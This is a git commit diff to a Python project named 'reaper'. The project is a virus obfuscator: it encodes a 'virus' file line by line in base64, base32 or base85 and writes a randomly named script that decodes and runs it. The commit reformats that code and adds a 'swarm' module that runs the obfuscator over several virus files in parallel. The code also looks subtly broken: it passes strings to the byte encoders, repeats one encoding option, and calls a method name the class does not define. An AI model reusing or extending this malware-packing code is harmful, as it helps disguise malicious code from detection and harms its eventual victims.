732ee1d694c0b3b69d2a5096c56e8c7c04ae60c5
Kye <kye@apacmediasolutions.com>
2023-10-18 12:13:33 -0400

    swarms of reaper

--- reaper/main.py
+++ reaper/main.py
@@ -65,25 +65,25 @@ class Reaper:
 
     def random_char(self, y):
         """Returns a random string of characters."""
-        return ''.join(random.choice(string.ascii_letters) for _ in range(y))
+        return "".join(random.choice(string.ascii_letters) for _ in range(y))
 
     def encrypt(self, lines):
         """Encrypts the virus."""
         enc, i = [], random.randint(1, 4)
         for line in lines:
             if i == 1:
-                enc.append(base64.b64encode(line) + '\n')
+                enc.append(base64.b64encode(line) + "\n")
             elif i == 2:
-                enc.append(base64.b32encode(line) + '\n')
+                enc.append(base64.b32encode(line) + "\n")
             elif i == 3:
-                enc.append(base64.b64encode(line) + '\n')
+                enc.append(base64.b64encode(line) + "\n")
             elif i == 4:
-                enc.append(base64.b85encode(line) + '\n')
+                enc.append(base64.b85encode(line) + "\n")
         return enc, i
 
     def write_lines(self, lines, virus):
         """Writes the encrypted virus to a file."""
-        with open(virus, 'a') as op:
+        with open(virus, "a") as op:
             op.write('strings = """')
             op.writelines(lines)
             op.write('"""')
@@ -91,11 +91,14 @@ class Reaper:
     def decrypt(self, lines, opt):
         """Decrypts the virus."""
         virus = self.random_char(random.randint(3, 8))
-        with open(virus, 'w') as op:
-            op.write("#!/usr/bin/python\nimport os, base64\n\noption = " + str(opt) + "\n")
+        with open(virus, "w") as op:
+            op.write(
+                "#!/usr/bin/python\nimport os, base64\n\noption = " + str(opt) + "\n"
+            )
         self.write_lines(lines, virus)
-        with open(virus, 'a') as op:
-            op.writelines("""
+        with open(virus, "a") as op:
+            op.writelines(
+                """
                 strings = strings.split('\n')
                 code = []
                 for string in strings:
@@ -113,7 +116,7 @@ class Reaper:
 
     def run(self, file, name):
         """Runs the virus."""
-        with open(file, 'r') as ip:
+        with open(file, "r") as ip:
             lines = [line for line in ip]
         code, opt = self.encrypt(lines)
         self.decrypt(code, opt)
--- reaper/swarm.py
+++ reaper/swarm.py
@@ -1,60 +1,63 @@
-import multiprocessing 
+import multiprocessing
 from reaper.main import Reaper
+from multiprocessing import Process
+from queue import PriorityQueue
 
 
 class MasterNode:
     """
-    
+
     Master Node: This node is responsible for distributing tasks to the worker nodes. It also collects the results from the worker nodes.
 
-    
+
     Attributes
     ----------
     tasks : list
         A list of tasks to be distributed to the worker nodes.
     results : list
         A list of results from the worker nodes.
-    
-        
+
+
 
     Usage:
 
     if __name__ == "__main__":
-    tasks = [("virus.py", "main"), ("virus2.py", "main"), ("virus3.py", "main")]
+    tasks = [(1, ("virus.py", "main")), (2, ("virus2.py", "main")), (3, ("virus3.py", "main"))]
     master = MasterNode(tasks)
     master.distribute_tasks()
     """
-    def __init__(
-        self,
-        tasks
-    ):
-        self.tasks = tasks
+
+    def __init__(self, tasks):
+        self.tasks = PriorityQueue()
+        for priority, task in tasks:
+            self.tasks.put((priority, task))
         self.results = []
-    
+
     def distribute_tasks(self):
-        """Distributes tasks to the worker nodes."""
-        with multiprocessing.Pool(
-            processes=multiprocessing.cpu_count()
-        ) as pool:
-            self.results = pool.map(
-                WorkerNode().run_task, self.tasks
-            )
+        with multiprocessing.Pool(processes=multiprocessing.cpu_count()) as pool:
+            while not self.tasks.empty():
+                priority, task = self.tasks.get()
+                self.results.append(
+                    pool.apply_async(WorkerNode().run_task, (task,))
+                )
+
 
 class WorkerNode:
     """
     Worker Nodes: These nodes are instances of the Reaper class. They perform the tasks assigned by the master node.
 
-    
+
     Attributes
     ----------
     reaper : Reaper
         An instance of the Reaper class.
-    
-    
+
+
     """
+
     def __init__(self):
         self.reaper = Reaper()
-    
+
     def run(self, task):
         """Runs the virus."""
         file, name = task
